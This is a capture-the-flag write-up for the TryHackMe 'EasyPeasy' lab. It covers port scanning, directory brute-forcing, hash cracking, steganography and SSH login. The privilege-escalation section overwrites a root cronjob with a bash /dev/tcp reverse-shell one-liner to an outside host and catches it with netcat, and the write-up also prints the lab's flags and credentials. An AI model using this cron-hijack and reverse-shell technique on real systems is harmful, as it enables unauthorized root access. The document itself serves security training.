# Tryhackme:EasyPeasy


*Challenge Description*:

*Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine.Then escalate your privileges through a vulnerable cronjob.The challenge link is [Here](https://tryhackme.com/room/easypeasyctf)*

 

# Task1

First,i only scanned the first 1000 ports,but it didn't helped much so after that i did a full scan.

```
nmap -sS -sV -p- 10.10.156.180 -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-09 19:29 IST
Nmap scan report for 10.10.156.180
Host is up (0.16s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 543.21 seconds

```
So Here we can see that there's `two` web server running on the machine on port `80` and `65524` and a ssh server on port `6498`.The web page on port 80 was nginx's default home page.so i tried gobuster and found a `hidden`directory,but there was not any info which could be useful to us.so i again run gobuster and found a whatever directory.

# Task2

```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ /home/lelouch/Tools/gobuster/gobuster dir -u http://10.10.163.86 -w wordlist 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.163.86
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/10 16:37:53 Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.163.86/hidden/]
                                                                                 
===============================================================
2022/05/10 16:37:54 Finished
===============================================================
```

```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ /home/lelouch/Tools/gobuster/gobuster dir -u http://10.10.163.86/hidden -w wordlist 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.163.86/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/10 16:38:12 Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.10.163.86/hidden/whatever/]
                                                                                          
===============================================================
2022/05/10 16:38:13 Finished
===============================================================
```
So in the source of whatever page,there was a base64 encoded data.when we decrypt it we get our first flag.
```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ echo "ZmxhZ3tmMXJzN19mbDRnfQ=="|base64 -d 
flag{f1rs7_fl4g}
```

Now let's move to the other webserver on.Here first i checked the source code of the page and there was some encoding present
```
  <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
```
It was encoded in base62,so when we decode it gives `/n0th1ng3ls3m4tt3r`. On the source code of the page, we found a hash,so i tried cracking it with johntheripper and the wordlist provided.

```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ /home/lelouch/Tools/john/run/john --wordlist=easypeasy.txt --format=gost hash hash
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2022-05-10 01:23) 2.941g/s 12047p/s 12047c/s 12047C/s fantasy14..flash88
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
if we check robots.txt on the apache server,we get a md5 hash ,after cracking it we get our second flag.[use this](https://md5hashing.net/) To crack the hash.
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
Now i tried to use `steghide` on `binarycodepixabay.jpg` using the password that we cracked earlier.Inside that file we got a `secrettext.txt` which contains a username and password in binary,so after converting binary to text we have a username and password which we can use to ssh into machine.

**ssh= boring:iconvertedmypasswordtobinary**

```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ ssh boring@10.10.163.86 -p 6498
The authenticity of host '[10.10.163.86]:6498 ([10.10.163.86]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '[10.10.163.86]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.163.86's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```
Now after logging into the machine ,we found user.txt,but the flag was rotated by rot13.
```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ echo "synt{a0jvgf33zfa0ez4y}"|rot13
flag{n0wits33msn0rm4l}
```
## Privilege escalation 

Now i had to escalate my privileges to get the root.txt,so i found a script running as root in crontab.so i edited it to get a root reverse shell and hence got the root flag.
```
boring@kral4-PC:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

```
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
#!/bin/bash
# i will run as root
```

**boring@kral4-PC:/var/www$ echo "/bin/bash -i >& /dev/tcp/10.8.16.42/1234 0>&1" > .mysecretcronjob.sh**


```
lelouch@lelouch-IdeaPad-3-15IML05-D:~/Tryhackme/Easy Peasy$ sudo nc -lvnp 1234
[sudo] password for lelouch: 
Listening on 0.0.0.0 1234
Connection received on 10.10.113.65 50794
bash: cannot set terminal process group (1445): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# python -c 'print("hello")'
python -c 'print("hello")'

Command 'python' not found, but can be installed with:

apt install python3       
apt install python        
apt install python-minimal

You also have python3 installed, you can run 'python3' instead.

root@kral4-PC:/var/www# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@kral4-PC:/var/www# ls
ls
html
root@kral4-PC:/var/www# cat /root/root.txt 
cat /root/root.txt 
cat: /root/root.txt: No such file or directory
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls
ls
root@kral4-PC:~# ls -al
ls -al
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 May  9 13:38 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt 	
cat .root.txt 
flag{63a9f0ea7bb98050796b649e85481845}
root@kral4-PC:~# 
```



